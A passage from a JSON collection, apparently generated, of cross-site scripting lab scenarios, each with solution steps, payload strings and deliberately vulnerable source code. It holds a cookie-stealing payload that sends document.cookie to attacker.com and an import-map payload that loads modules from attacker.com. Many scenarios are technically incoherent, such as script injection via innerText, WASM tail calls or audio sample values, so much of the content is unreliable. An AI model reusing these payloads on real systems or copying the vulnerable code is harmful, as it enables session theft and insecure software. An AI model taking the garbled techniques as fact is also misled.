    "Lab scenario": "WebAuthn Authenticator Tampering in SSO Dashboard",
    "Lab Description": "Single sign-on system parses WebAuthn authenticatorData without CBOR validation. The application reflects credential ID in admin panel via innerText. To solve: Inject HTML through crafted attestationObject extensions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Clone authenticator using FIDO2 emulation tools",
      "Craft malicious CBOR: {1: {2: \"<script>alert(1)</script>\"}}",
      "Bypass base64url encoding using non-UTF8 sequences",
      "Automate using Python fido2 library modifications",
      "Verify in Safari's WebAuthn implementation"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "eyJ0eXBlIjoid2ViYXV0aG4uZ2V0IiwiY2hhbGxlbmdlIjoiQUJDIiwiZGlzcGxheU5hbWUiOiI8aW1nIHNyYz14IG9uZXJyb3I9YWxlcnQoMSk+In0=",
      "authData:new Uint8Array([...atob('<svg/onload=alert(1)>')])"
    ],
    "srcCode": "app.post('/webauthn', (req, res) => {\n  const credential = cbor.decode(req.body.response);\n  db.saveCredential(credential.id); // Raw storage\n  console.debug('AuthData:', credential); // Verbose\n});"
  },
  {
    "Lab scenario": "IndexedDB Schema Pollution in Analytics Dashboard",
    "Lab Description": "User analytics platform creates dynamic object stores using URL parameters. The application uses eval() to generate IndexedDB indexes. To solve: Achieve XSS through NoSQL key injection and query engine reflection.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify DB schema generation via Chrome Storage Inspector",
      "Craft store name: ']);alert(1);(['",
      "Bypass key validation using multi-entry indexes",
      "Chain with cursor.continue() infinite loops",
      "Verify through dashboard metric visualization"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "db.createObjectStore('${alert(1)}');",
      "index: 'value.replace(/^/, \"</script><svg/onload=alert(1)>\")'"
    ],
    "srcCode": "const createStore = (name) => {\n  eval(`db.createObjectStore('${name}', { \n    keyPath: 'id'\n  })`);\n};\ncreateStore(req.query.storeName);"
  },
  {
    "Lab scenario": "Web Bundle XSS in Document Collaboration Tool",
    "Lab Description": "Shared document viewer parses .wbn files with vulnerable integrity checks. The application uses incorrect Content-Type for nested resources. To solve: Achieve XSS through malicious resource embedding in signed bundle.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze existing bundles using wbn-inspect tool",
      "Inject payload in resources section with text/html type",
      "Bypass signature using length extension attacks",
      "Combine with brotli compression oracle",
      "Verify in Chrome's Isolated Web Apps"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "--boundary\nContent-Type: text/html\n\n<script>alert(1)</script>\n--boundary--",
      "sha256-/3yc...=: <html><body onload=alert(1)></body></html>"
    ],
    "srcCode": "app.post('/upload', (req, res) => {\n  const bundle = parseWebBundle(req.body);\n  if(bundle.signatureValid) {\n    res.render('preview', { content: bundle.resources[0] });\n  }\n});"
  },
  {
    "Lab scenario": "WebTransport Protocol Hijacking in Virtual Classroom",
    "Lab Description": "Educational platform uses WebTransport for real-time document sync with unvalidated stream processing. The application converts binary streams to text via vulnerable TextDecoder. To solve: Achieve XSS through bidirectional stream poisoning.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture WebTransport handshake using Chrome's chrome://net-export",
      "Craft polyglot stream: new TextEncoder().encode('</script><svg onload=alert(1)>')",
      "Bypass MIME sniffing protection using null-byte padding",
      "Automate hijacking with Python trio-websocket library",
      "Verify through collaborative document editing"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "data:application/octet-stream;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
      "webtransport://example.com/#<iframe/src=javascript:alert(1)>"
    ],
    "srcCode": "const transport = new WebTransport('https://example.com');\nconst writer = transport.datagrams.writable.getWriter();\nawait writer.write(new TextEncoder().encode(userContent)); // Unsafe"
  },
  {
    "Lab scenario": "SharedArrayBuffer Timing XSS in Cryptocurrency Wallet",
    "Lab Description": "Digital wallet uses SharedArrayBuffer for transaction signing with side-channel leaks. The application reflects timing differences in UI updates. To solve: Exfiltrate private key via precision timing attacks and DOM injection.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Measure performance.now() differences during signing operations",
      "Craft payload: <div id=${leakedKey}></div>",
      "Bypass Spectre mitigations using Web Workers",
      "Chain with requestAnimationFrame() precision timing",
      "Verify through transaction history reflection"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<script>new SharedArrayBuffer(1024);Atomics.store(heap,0,Date.now())</script>",
      "onpointerrawupdate=({timeStamp})=>alert(timeStamp)"
    ],
    "srcCode": "app.post('/sign', (req, res) => {\n  const buffer = new SharedArrayBuffer(256);\n  performCryptoOp(buffer);\n  res.send(`<div>Operation took: ${performance.now()}ms</div>`); // Vulnerable\n});"
  },
  {
    "Lab scenario": "Import Maps Injection in Micro-Frontend Architecture",
    "Lab Description": "Enterprise dashboard uses dynamic import maps for module loading. The application constructs import map JSON from URL parameters without validation. To solve: Hijack module resolution to load malicious ES6 modules.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept import map request via Burp Suite",
      "Inject payload: {\"imports\": {\"@app/\": \"https://attacker.com/\"}}",
      "Bypass integrity checks using import assertions",
      "Automate with Playwright script testing module aliases",
      "Verify through Chrome DevTools Sources panel"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "import('https://attacker.com/malicious.js', {assert: {type: 'json'}});",
      "<script type=\"importmap\">{\"imports\":{\"lodash\":\"data:text/javascript,alert(1)\"}}</script>"
    ],
    "srcCode": "app.get('/import-map', (req, res) => {\n  res.json({\n    imports: JSON.parse(req.query.modules) // Vulnerable\n  });\n});"
  },
  {
    "Lab scenario": "Trusted Types Bypass via iframe Policy Inheritance in CMS",
    "Lab Description": "Content management system implements Trusted Types but allows policy inheritance in iframes. The application uses document.write() in nested browsing contexts. To solve: Escape iframe sandbox through prototype pollution of default policy.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify iframe with lax policy using TT auditor extension",
      "Craft payload: <iframe srcdoc=\"<script>alert(1)</script>\">",
      "Bypass CSP using policy.createHTML() callback override",
      "Chain with DOM clobbering of trustedTypes.defaultPolicy",
      "Verify in Chromium-based browsers with TT enforcement"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "trustedTypes.createPolicy('default', {createHTML: s => s});",
      "<iframe src=\"javascript:trustedTypes.emptyHTML\"></iframe>"
    ],
    "srcCode": "app.get('/embed', (req, res) => {\n  res.send(`<iframe srcdoc='${req.query.content}'></iframe>`);\n  console.warn('Unsanitized iframe content:', req.query.content); // Debug log\n});"
  },
  {
    "Lab scenario": "WASI Filesystem Polyglot XSS in Document Converter",
    "Lab Description": "Cloud file converter executes WASI modules for format transformations. The application maps virtual filesystems without path validation. To solve: Write malicious JS to DOM through filesystem-to-UI bridge.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze WASI syscalls using Wasmer debugger",
      "Craft payload: fs.writeFileSync('/dom/output', '<script>alert(1)</script>')",
      "Bypass filename restrictions using NTFS stream syntax",
      "Automate with WebAssembly Studio CLI",
      "Verify through converted document preview"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "wasmtime run --mapdir /dom::./malicious.wasm",
      "fs.readFileSync('\\\\?\\C:\\dom', {encoding: 'utf8'})"
    ],
    "srcCode": "const wasi = new WASI({\n  preopenDirectories: { '/dom': process.cwd() } // Dangerous\n});\nfs.readFile('output.html', (err, data) => {\n  document.body.innerHTML = data.toString(); // Vulnerable\n});"
  },
  {
    "Lab scenario": "WebTransport Bidirectional Stream XSS in Autonomous Vehicle Telemetry",
    "Lab Description": "Self-driving car interface processes WebTransport bidirectional streams with unsafe TextDecoderStream handling. The application renders real-time sensor data via innerHTML concatenation. To solve: Inject fragmented XSS payloads through stream chunk manipulation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept WebTransport session via Chrome DevTools Protocol",
      "Craft payload: writer.write(new TextEncoder().encode('</script><svg onload=alert(1)>'))",
      "Bypass chunk validation using QUIC stream resets",
      "Automate with webtransport-py client library",
      "Verify through 3D LiDAR visualization"
    ],
    "payloads": [
      "new TextEncoder().encode('</script><iframe/src=javascript:alert(1)></iframe>')",
      "data:application/octet-stream;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
    ],
    "srcCode": "const stream = await transport.createBidirectionalStream();\nconst reader = stream.readable.getReader();\nreader.read().then(({value}) => {\n  dashboard.innerHTML += new TextDecoder().decode(value); // Vulnerable\n});"
  },
  {
    "Lab scenario": "CSS Font Palettes XSS in Branding Toolkit",
    "Lab Description": "Corporate branding platform implements @font-palette-values with unsafe CSSOM manipulation. The application allows user-defined palette names via template literals. To solve: Break style context through palette name injection.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify font palette usage via Computed Styles",
      "Craft payload: @font-palette-values --</style><script>alert(1)</script>",
      "Bypass sanitizer using CSS escape sequences",
      "Chain with @font-face local() source",
      "Verify through PDF style guide export"
    ],
    "payloads": [
      "@font-palette-values --\\3C script\\3E { font-family: x; }",
      "override-colors: 0 #ffffff</style><svg/onload=alert(1)>"
    ],
    "srcCode": "const styles = `@font-palette-values ${userName} { ${userRules} }`;\ndocument.adoptedStyleSheets.push(new CSSStyleSheet().replace(styles));"
  },
  {
    "Lab scenario": "WebNN Model Weights XSS in AI-Powered Recruiting",
    "Lab Description": "Job matching service loads ONNX models with unsafe tensor metadata reflection. The application displays model layer names in debug UI via innerHTML. To solve: Inject HTML through crafted weight matrix labels.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Modify ONNX model using onnx-modifier",
      "Craft payload: {\"name\":\"</title><svg/onload=alert(1)>\"}",
      "Bypass model signature validation via int8 quantization",
      "Chain with WebGPU buffer binding",
      "Verify through candidate matching dashboard"
    ],
    "payloads": [
      "tensor([[60,115,99],[114,105,112],[116,62]]) <!-- ASCII <script> -->",
      "model_outputs[0].name = '</script><img/src=x onerror=alert(1)>'"
    ],
    "srcCode": "const model = await navigator.ml.createContext().loadModel(userUpload);\ndebugUI.innerHTML += model.outputs.map(o => o.name).join(', ');"
  },
  {
    "Lab scenario": "ARIA 2.0 Role XSS in Accessibility Dashboard",
    "Lab Description": "WCAG compliance tool implements ARIA 2.0 roles with dangerous aria-description reflection. The application uses setAttribute('aria-description') with raw user input. To solve: Abuse aria-details to bypass sanitization.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify ARIA 2.0 support via a11y tree",
      "Craft payload: <div role=\"generic\" aria-details=\"</div><script>alert(1)</script>\">",
      "Bypass DOM clobbering protections using ShadowRoot",
      "Chain with aria-flowto focus redirection",
      "Verify through axe-core audit results"
    ],
    "payloads": [
      "<span role=\"math\" aria-describedat=\"x\"><template id=\"x\" shadowroot=open><script>alert(1)</script>",
      "<div aria-roledescription=\"\\3C script\\3E alert(1) \\3C /script\\3E\"></div>"
    ],
    "srcCode": "element.setAttribute('aria-description', userInput);\n// Vulnerable aria reflection: document.getElementById('a11y-tree').innerHTML = element.outerHTML;"
  },
  {
    "Lab scenario": "WebCodecs AudioFrame XSS in Podcast Platform",
    "Lab Description": "Audio hosting service processes raw AudioFrame data with unsafe waveform visualization. The application renders decoded samples via <canvas> with vulnerable data URI generation. To solve: Inject payloads through crafted PCM sample values.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Generate malicious WAV file with Audacity",
      "Craft payload: PCM samples matching [60,115,99,114...] (ASCII <script>)",
      "Bypass sample rate validation using resampling",
      "Chain with Web Audio API AnalyserNode",
      "Verify through waveform SVG export"
    ],
    "payloads": [
      "new AudioData({sampleRate: 44100, data: new Float32Array([0.000060, 0.000115, ...])",
      "data:audio/wav;base64,UklGRl8AAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQ==..."
    ],
    "srcCode": "const decoder = new AudioDecoder({\n  output: frame => {\n    canvasCtx.fillText(frame.timestamp.toString(), 10, 10); // Vulnerable\n  }\n});"
  },
  {
    "Lab scenario": "WebAssembly Tail Call XSS in Code Optimization Platform",
    "Lab Description": "Performance tool visualizes WASM tail call optimizations with unsafe error message rendering. The application displays function names via innerHTML during stack trace debugging. To solve: Inject HTML through malformed tail call recursion metadata.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Compile WASM with malformed tail calls using wasm-tools",
      "Craft payload: (func $xss (param i32) (result i32) (return_call $xss))",
      "Bypass stack depth validation using mutual recursion",
      "Chain with exception handling postMessage",
      "Verify via debugger stack visualization"
    ],
    "payloads": [
      "(module (func $xss (return_call $xss)) (start $xss))",
      "data:application/wasm;base64,AGFzbQEAAAABBwF/AkAACgEBAX8BAAALBwEEAQEBAQEBAQsHAXwDAQEBAQAKCwEJAEECfwFBCgAaAAoACQA="
    ],
    "srcCode": "try { instance.exports.optimize(); } catch (e) {\n  debuggerUI.innerHTML = e.stack; // Vulnerable\n}"
  },
  {
    "Lab scenario": "CSS Animation Timeline XSS in Interactive Storytelling Platform",
    "Lab Description": "Multimedia platform implements scroll-driven animations with unsafe timeline name handling. The application allows user-controlled animation-timeline names via CSSOM. To solve: Break style context through timeline identifier injection.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify timeline binding via Animations panel",
      "Craft payload: animation-timeline: --</style><script>alert(1)</script>",
      "Bypass sanitizer using CSS escape sequences",
      "Chain with @scroll-timeline polyfill",
      "Verify through EPUB export rendering"
    ],
    "payloads": [
      "@keyframes x { from { timeline-scope: \\3C script\\3E } }",
      "animation: x linear; animation-timeline: --\\3C script\\3E"
    ],
    "srcCode": "const sheet = new CSSStyleSheet();\nsheet.replaceSync(`@keyframes ${userName} { ... }`);\ndocument.adoptedStyleSheets.push(sheet);"
  },
  {
    "Lab scenario": "WebLocks API Race Condition XSS in Collaborative Editor",
    "Lab Description": "Real-time document editor implements WebLocks with unsafe lock name reflection. The application displays active locks in debug UI via dangerouslySetInnerHTML. To solve: Trigger XSS through rapid lock acquisition/release cycles.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify lock acquisition via Performance tab",
      "Craft payload: navigator.locks.request('</script><svg/onload=alert(1)>', () => {})",
      "Bypass name validation using Unicode bidirectional override",
      "Automate with Promise.all() race attacks",
      "Verify through debug overlay"
    ],
    "payloads": [
      "navigator.locks.request('\\202E}\\202Ealert(1)//', () => {})",
      "lockManager.query().then(locks => { document.body.innerHTML = locks.held; })"
    ],
    "srcCode": "navigator.locks.request(userLockName, async lock => {\n  debugDiv.innerHTML += `Lock: ${lock.name}`; // Vulnerable\n});"
  },
  {
    "Lab scenario": "WebUSB Descriptor Spoofing XSS in Industrial Control Panel",
    "Lab Description": "SCADA system connects to USB-HID devices with unsafe descriptor parsing. The application renders device serial numbers via innerText with vulnerable CSS escapes. To solve: Spoof USB descriptors with malicious serial numbers.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Program USB device using Teensy 4.1",
      "Craft payload: \"serialNumber\": \"\\3C script\\3E alert(1)\\3C /script\\3E\"",
      "Bypass descriptor validation using phantom interfaces",
      "Automate with WebUSB polyfill",
      "Verify through HMI dashboard"
    ],
    "payloads": [
      "{\"vendorId\":0x1234,\"productId\":0x5678,\"serialNumber\":\"<iframe/src=javascript:alert(1)>\"}",
      "usbDevice.controlTransferOut({data: new TextEncoder().encode('</script>')})"
    ],
    "srcCode": "navigator.usb.requestDevice({ filters: [] }).then(device => {\n  statusDiv.innerText = device.serialNumber; // Vulnerable CSS unescape\n});"
  },
  {
    "Lab scenario": "SVG Font Kerning XSS in E-Book Reader",
    "Lab Description": "EPUB renderer processes SVG font kerning pairs with unsafe `<hkern>` parsing. The application uses DOMPurify 3.0.0 with whitelisted `<hkern>` attributes. To solve: Inject XSS through glyph name overflows.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Craft EPUB with malicious SVG font using Sigil",
      "Inject payload: <hkern g1=\"</font><script>alert(1)</script>\" g2=\"x\"/>",
      "Bypass MIME validation using polyglot EPUB/ZIP",
      "Chain with CSS font-variant-ligatures",
      "Verify through footnote rendering"
    ],
    "payloads": [
      "<font><hkern g1=\"\\3C script\\3E\" g2=\"alert(1)\"/>",
      "@font-face { font-family:x; src:url('data:image/svg+xml,<svg>...</svg>') }"
    ],
    "srcCode": "bookRenderer.loadFont(userFont).then(() => {\n  viewerDiv.innerHTML = bookContent; // Vulnerable\n});"
  },
  {
    "Lab scenario": "WebGPU Storage Texture XSS in 3D Medical Imaging",
    "Lab Description": "Radiology viewer maps storage textures to DOM via unsafe buffer sharing. The application visualizes DICOM data using compute shaders without output validation. To solve: Corrupt texture data to inject HTML through FP32 precision abuse.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Reverse-engineer shader with WGSL analyzer",
      "Craft payload: [[group(2), binding(0)]] var tex: texture_storage_2d<rgba8unorm, write>",
      "Bypass format checks using texture view reinterpretation",
      "Chain with indirect dispatch validation bypass",
      "Verify through DICOM metadata overlay"
    ],
    "payloads": [
      "textureStore(tex, vec2<i32>(), vec4<f32>(0.000060, 0.000115, 0.000099, 0.000062)) <!-- ASCII <script> -->",
      "dispatchWorkgroupsIndirect(/* buffer with 0x3C736372 payload */)"
    ],
    "srcCode": "const texture = device.createTexture({ format: 'rgba8unorm', usage: GPUTextureUsage.STORAGE });\ndocument.getElementById('overlay').innerHTML = \n  new TextDecoder().decode(texture.read());"
  },
  {
    "Lab scenario": "CSS Scope Escalation XSS in Design System Builder",
    "Lab Description": "Component library implements @scope rules with vulnerable selector concatenation. The application allows user-controlled scope roots via template literals. To solve: Break style isolation through universal selector abuse.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify scope boundary via Computed Styles",
      "Craft payload: @scope ([attr^=\"</style><script>alert(1)</script>\"])",
      "Bypass sanitizer using CSS Unicode escapes",
      "Chain with :has() selector polyfill",
      "Verify through design token preview"
    ],
    "payloads": [
      "@scope (\\3C script\\3E) { :scope { color: red; } }",
      "[attr^='</style><iframe/src=javascript:alert(1)>'] { --x: ; }"
    ],
    "srcCode": "const styles = `@scope (${userInput}) { /* ... */ }`;\ndocument.adoptedStyleSheets.push(new CSSStyleSheet().replace(styles));"
  },
  {
    "Lab scenario": "Fetch Priority Injection XSS in Ad Tech Platform",
    "Lab Description": "Real-time bidding system reflects Fetch Priority headers in debug logs without sanitization. The application uses innerHTML with server-side header logging. To solve: Bypass header normalization via HTTP/2 stream multiplexing.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept bid request via Charles Proxy",
      "Inject payload: Priority: u=3, i=\"<script>alert(1)</script>\"",
      "Bypass HPACK compression using literal headers",
      "Automate with h2load stress testing",
      "Verify through bid analytics dashboard"
    ],
    "payloads": [
      "Sec-Priority: '\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E'",
      "Accept-CH: Lifetime=<svg/onload=alert(document.domain)>"
    ],
    "srcCode": "app.get('/debug', (req, res) => {\n  res.send(`<pre>Priority: ${req.headers['priority']}</pre>`); // Vulnerable\n});"
  },
  {
    "Lab scenario": "WebHID Barcode Scanner XSS in Inventory System",
    "Lab Description": "Warehouse management system processes USB barcode scanners with unsafe HID report parsing. The application renders scanned data via innerText with CSS unescape. To solve: Spoof barcode payloads through custom report descriptors.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Program HID device using Flipper Zero",
      "Craft payload: \"usagePage\": 0xFF60, \"usage\": 0x3C736372 (Hex for <script)",
      "Bypass input validation using report ID spoofing",
      "Automate with WebHID report listener",
      "Verify through stock level dashboard"
    ],
    "payloads": [
      "{\"vendorId\":0x1234,\"productId\":0x5678,\\'reportDescriptor\":[0x06, 0x60, 0xFF, ... /* <script> */]}",
      "inputReportCache = new Uint8Array([0x3C, 0x73, 0x63, 0x72, 0x69, 0x70, 0x74, 0x3E])"
    ],
    "srcCode": "device.addEventListener('inputreport', e => {\n  inventoryList.innerText += new TextDecoder().decode(e.data); // Vulnerable CSS unescape\n});"
  },
  {
    "Lab scenario": "MathML Entity XSS in Scientific Publishing Platform",
    "Lab Description": "Research paper viewer processes MathML equations with unsafe entity expansion. The application uses DOMPurify 3.0.0 with broken &ent; unescape handling. To solve: Abuse entity references to reconstruct script tags.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify MathML rendering via Elements panel",
      "Craft payload: &lt;script&gt;alert(1)&lt;/script&gt;",
      "Bypass sanitizer using numeric character references",
      "Chain with <maction> behavior handlers",
      "Verify through PDF equation export"
    ],
    "payloads": [
      "<math><mtext>&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;</mtext></math>",
      "<menclose notation='updiagonalstrike'></menclose><script>alert(1)</script>"
    ],
    "srcCode": "app.post('/equation', (req, res) => {\n  res.send(`<math>${req.body.content}</math>`); // Vulnerable entity handling\n});"
  },
  {
    "Lab scenario": "WebAssembly SIMD Memory Corruption in Cryptography Toolkit",
    "Lab Description": "Blockchain library uses WASM SIMD for fast hashing with unsafe memory mapping to DOM. The application reflects SIMD vector results via innerHTML during debug mode. To solve: Manipulate v128 values to craft HTML payloads through vector lane corruption.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Compile SIMD module with wasm-pack",
      "Craft payload: i32x4.splat(0x3C736372) <!-- ASCII <scr -->",
      "Bypass lane validation using shuffle operations",
      "Chain with relaxed SIMD proposals",
      "Verify via debug console hexdump"
    ],
    "payloads": [
      "v128.load(mem, i32.const 0).i32x4.replace_lane(0, 0x3C)",
      "data:application/wasm;base64,V2FzbVZlcnNpb24gMS4wCgA="
    ],
    "srcCode": "const simdMem = new WebAssembly.Memory({ initial: 1 });\nconst instance = await WebAssembly.instantiate(simdModule, { env: { simdMem } });\ndocument.getElementById('debug').innerHTML = \n  new TextDecoder().decode(simdMem.buffer);"
  },
  {
    "Lab scenario": "CSS Font Tech XSS in Digital Publishing Platform",
    "Lab Description": "E-book platform implements COLRv1 fonts with unsafe variation axis handling. The application allows user-controlled font variations via CSSOM. To solve: Abuse font tech features to break style context through axis overflow.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create malicious variable font using FontForge",
      "Craft payload: font-variation-settings: \"</style><script>alert(1)</script>\" 1",
      "Bypass axis validation using fractional values",
      "Chain with font-palette property",
      "Verify through EPUB rendering engine"
    ],
    "payloads": [
      "@font-face { font-family:x; src:url('data:font/woff2;base64,...') }",
      "font-variation-settings: \"\\3C script\\3E\" 1"
    ],
    "srcCode": "const sheet = new CSSStyleSheet();\nsheet.replaceSync(`:root { ${userFontRules} }`);\ndocument.adoptedStyleSheets = [sheet];"
  },
  {
    "Lab scenario": "WebTransport Datagram Reflection in Drone Fleet Management",
    "Lab Description": "UAV control system processes QUIC datagrams with unsafe buffer accumulation. The application renders telemetry data via innerHTML without validation. To solve: Inject XSS through fragmented datagram payloads with MTU bypass.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Craft DATAGRAM frames using ngtcp2",
      "Split payload: [0x3C, 0x73], [0x63, 0x72], ...",
      "Bypass flow control using connection migration",
      "Automate with webtransport-go",
      "Verify through 3D flight path visualization"
    ],
    "payloads": [
      "quic.SendDatagram([]byte{'<','s','c','r','i','p','t','>'})",
      "data:application/datagram;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
    ],
    "srcCode": "transport.datagrams.readable.getReader().read().then(({value}) => {\n  telemetryDiv.innerHTML += new TextDecoder().decode(value); // Vulnerable\n});"
  },
  {
    "Lab scenario": "WebNFC NDEF Type Spoofing in Retail Inventory",
    "Lab Description": "Smart shelf system processes NFC tags with unsafe NDEF type handling. The application renders product URLs via innerHTML without validation. To solve: Spoof NDEF records with javascript: payloads in type fields.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Program NFC tag with NDEF type: 'text/javascript'",
      "Craft payload: NDEFRecord({ recordType: 'javascript:alert(1)' })",
      "Bypass URL validation using UTF-16 encoding",
      "Automate with WebNFC polyfill",
      "Verify through mobile PWA interface"
    ],
    "payloads": [
      "ndefWriter.write({ records: [{ recordType: 'javascript:alert(1)', data: new TextEncoder().encode('') }] })",
      "navigator.nfc.push('javascript:/*%00*/alert(document.domain)')"
    ],
    "srcCode": "navigator.nfc.watch(message => {\n  productList.innerHTML += message.records[0].recordType; // Vulnerable\n});"
  },
  {
    "Lab scenario": "ARIA 2.0 Property Clobbering in Accessibility Dashboard",
    "Lab Description": "WCAG compliance tool implements aria-keyshortcuts with dangerous DOM reflection. The application uses element.outerHTML to display ARIA states. To solve: Abuse aria-colcount/aria-rowindex to clobber DOM properties.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify ARIA 2.0 property reflection",
      "Craft payload: <div aria-colcount=\"</div><script>alert(1)</script>\">",
      "Bypass sanitizer using aria-atomic=\"true\"",
      "Chain with shadow DOM slot distribution",
      "Verify through automated a11y audits"
    ],
    "payloads": [
      "<table aria-rowindex=\"\\3C script\\3E alert(1)\"></table>",
      "<div role='grid' aria-colcount='<iframe/src=javascript:alert(1)>'></div>"
    ],
    "srcCode": "element.setAttribute('aria-keyshortcuts', userInput);\n// Vulnerable reflection: auditLog.innerHTML = element.outerHTML;"
  },
  {
    "Lab scenario": "DOM-based XSS in Healthcare Portal URL Fragment Processing",
    "Lab Description": "Patient records system dynamically loads content from URL fragments using vulnerable decodeURIComponent() parsing. The application renders lab results without output encoding. To solve: Execute alert(document.domain) through double-encoded hash payloads.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept fragment change event using Burp Suite's DOM Invader extension",
      "Validate with payload: #%3Cimg%2520src%3Dx%2520onerror%3Dalert%25281%2529%3E",
      "Bypass client-side validation using null-byte termination",
      "Chain with history.replaceState() to trigger parser differential",
      "Verify in legacy browser modes"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "#<img%20src=x%20onerror=alert(window.origin)>",
      "javascript:eval(decodeURIComponent('%61%6c%65%72%74%28%64%6f%63%75%6d%65%6e%74%2e%64%6f%6d%61%69%6e%29'))"
    ],
    "srcCode": "window.onhashchange = () => {\n  const content = decodeURIComponent(location.hash.slice(1));\n  document.getElementById('results').innerHTML = content; // Vulnerable\n}"
  },
  {
    "Lab scenario": "Stored XSS in E-Commerce Product Reviews via AngularJS Sandbox Escape",
    "Lab Description": "Product review system uses AngularJS 1.8 with unsafe $sce configuration. The application sanitizes input but allows certain HTML elements. To solve: Achieve persistent XSS using prototype pollution in review comments.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify AngularJS version via source map analysis",
      "Craft payload: {{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}",
      "Bypass CSP using angular.element().append() sink",
      "Automate with Postman collection targeting /api/reviews",
      "Verify persistence across user sessions"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<div ng-app>{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}</div>",
      "<input ng-focus=\"$event.path[0].ownerDocument.defaultView.alert(1)\">"
    ],
    "srcCode": "app.post('/reviews', (req, res) => {\n  const review = {\n    content: req.sanitize(req.body.content) // Incomplete\n  };\n  db.save(review);\n});"
  },
  {
    "Lab scenario": "Mutation XSS in Social Media SVG Avatar Upload",
    "Lab Description": "Profile picture uploader accepts SVG files but fails to sanitize foreignObject tags. The application uses DOMPurify 2.4.0 with unsafe configuration. To solve: Achieve XSS through namespace confusion in SVG/HTML5 parser.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Upload test SVG using OWASP ZAP file upload scanner",
      "Craft payload: <svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>",
      "Bypass sanitizer using MathML namespace prefixes",
      "Combine with iframe srcdoc attribute",
      "Verify in Firefox's SVG rendering engine"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<svg><foreignObject><body><script>alert(1)</script></body></foreignObject></svg>",
      "<svg><animate attributeName='href' values='javascript:alert(1)'/>"
    ],
    "srcCode": "app.post('/avatar', (req, res) => {\n  const svg = DOMPurify.sanitize(req.files.avatar.data);\n  fs.writeFileSync(uploadPath, svg); // Sanitization bypass\n});"
  },
  {
    "Lab scenario": "Blind XSS in Customer Support Chat WebSocket Messages",
    "Lab Description": "Live chat application stores WebSocket messages in admin panel with 12-hour delay. The application uses raw WebSocket.send() without output encoding. To solve: Trigger alert() when support agent views chat history.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept WebSocket handshake with Burp Suite",
      "Craft delayed payload: <img src=x onerror=setTimeout(()=>alert(1),43200000)>",
      "Bypass message size limits using DEFLATE compression",
      "Automate with Python websockets library",
      "Monitor admin interface for payload execution"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<script>fetch('https://attacker.com?cookie='+document.cookie)</script>",
      "<iframe srcdoc='<script>parent.alert(1)</script>'></iframe>"
    ],
    "srcCode": "wss.on('connection', (ws) => {\n  ws.on('message', (msg) => {\n    db.storeMessage(msg); // Raw storage\n  });\n});"
  },
  {
    "Lab scenario": "Reflected XSS in Travel Booking API JSONP Endpoint",
    "Lab Description": "Flight search API implements JSONP callback without validation. The application reflects callback parameter in Content-Type header. To solve: Achieve XSS through JavaScript MIME type confusion.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Identify JSONP endpoint via ?callback= param",
      "Craft payload: /api/search?callback=alert(1)//",
      "Bypass charset restrictions using UTF-7 encoding",
      "Automate with curl and timing analysis",
      "Verify in IE11 compatibility mode"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "/**/alert(1);",
      ")?}alert(1);//",
      "jQuery3110([{data:1}])"
    ],
    "srcCode": "app.get('/api/search', (req, res) => {\n  res.set('Content-Type', 'application/javascript');\n  res.send(`${req.query.callback}(${JSON.stringify(results)})`);\n});"
  },
  {
